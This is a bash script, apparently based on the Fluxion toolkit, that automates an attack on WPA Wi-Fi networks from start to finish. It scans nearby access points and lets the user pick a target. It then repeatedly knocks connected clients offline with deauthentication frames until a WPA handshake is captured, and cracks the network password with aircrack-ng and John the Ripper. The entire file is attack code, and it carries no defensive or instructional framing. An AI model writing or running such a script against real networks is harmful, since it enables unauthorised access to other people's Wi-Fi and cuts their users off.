DUMP_PATH=`pwd`
./airmon start wlan0
sleep 2
rm -f $DUMP_PATH/dumpdata/*
xterm -title "scanning wifi" -geometry  100x70+0+0 -bg "#FFFFFF" -fg "#000000" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dumpdata/dump -a mon0 --ignore-negative-one
sleep 2
function exitmode {
        ./airmon stop mon0
        ./airmon stop wlan0
	killall xterm
	exit
}
function capture {

	if ! ps -A | grep -q airodump-ng; then

		rm -rf $DUMP_PATH/dumpdata/$Host_MAC*
		xterm -hold -title "Capturing data on channel --> $Host_CHAN" -geometry 90x27-0+0 -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $DUMP_PATH/dumpdata/$Host_MAC -c $Host_CHAN -a mon0 &
	fi
}

function deauthesp {
	echo "deauthtime>"
	read DEAUTHTIME 
	xterm -geometry 90x20-0-0 -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one mon0 &
	sleep 3
	checkhandshake
}

function checkhandshake {
		if aircrack-ng $DUMP_PATH/dumpdata/$Host_MAC-01.cap | grep -q "1 handshake"; then
			read -p "Press ENTER to Password Cracking start"
			killall airodump-ng mdk3 aireplay-ng &>/dev/null
		        aircrack-ng $DUMP_PATH/dumpdata/$Host_MAC-01.cap -J $DUMP_PATH/dumpdata/$Host_MAC
		        hccap2john $DUMP_PATH/dumpdata/$Host_MAC.hccap >$DUMP_PATH/dumpdata/$Host_MAC.txt
		        john $DUMP_PATH/dumpdata/$Host_MAC.txt
		        read -p "Press ENTER to exit"
		        exitmode
		else
			echo -e "Status handshake: $Handshake_statuscheck"
			echo
			echo -e "      1) check handshake"
			echo -e "      2) deauth again"
			echo -e "      3) exit"
			echo -n '      #> '
			read yn

			case $yn in
				1 ) checkhandshake;;
				2 ) deauthesp; break;;
				3 ) exitmode;;
			esac
		fi

}


function deauth {

	iwconfig mon0 channel $Host_CHAN

	case $1 in
		esp )
			DEAUTH=deauthesp
			HOST=`cat $DUMP_PATH/dumpdata/dump-01.csv | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`


			capture
			for CLIENT in $HOST; do
				Client_MAC=`echo ${CLIENT:0:17}`
				deauthesp
			done
		;;
	esac
	exitmode

}

function selection {


	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/dumpdata/dump-01.csv | awk '{print $1}'`

	fluxionap=`cat $DUMP_PATH/dumpdata/dump-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	fluxionap=`expr $fluxionap - 1`
	head -n $fluxionap $DUMP_PATH/dumpdata/dump-01.csv &> $DUMP_PATH/dumpdata/dump-02.csv
	tail -n +$fluxionap $DUMP_PATH/dumpdata/dump-01.csv &> $DUMP_PATH/dumpdata/clientes.csv
	echo "                        WIFI LIST "
	echo ""
	echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
	echo ""
	i=0

	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
		longueur=${#MAC}
		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		PRIVACY=${PRIVACY:0:4}
		if [ $longueur -ge 17 ]; then
			i=$(($i+1))
			POWER=`expr $POWER + 100`
			CLIENTE=`cat $DUMP_PATH/dumpdata/clientes.csv | grep $MAC`

			if [ "$CLIENTE" != "" ]; then
				CLIENTE="*"
			echo -e " ""$red "$i")"$green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""

			else

			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""

			fi

			aidlenght=$IDLENGTH
			assid[$i]=$ESSID
			achannel[$i]=$CHANNEL
			amac[$i]=$MAC
			aprivacy[$i]=$PRIVACY
			aspeed[$i]=$SPEED
		fi
	done < $DUMP_PATH/dumpdata/dump-02.csv
	echo
	echo -e ""$green "("$white"*"$green")Active clients""\e[0m"""
	echo ""
	echo -n "      #> "
	read choice


	idlenght=${aidlenght[$choice]}
	ssid=${assid[$choice]}
	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#ssid}
	fin=$(($acouper-idlength))
	Host_SSID=${ssid:1:fin}
	deauth esp
}
selection

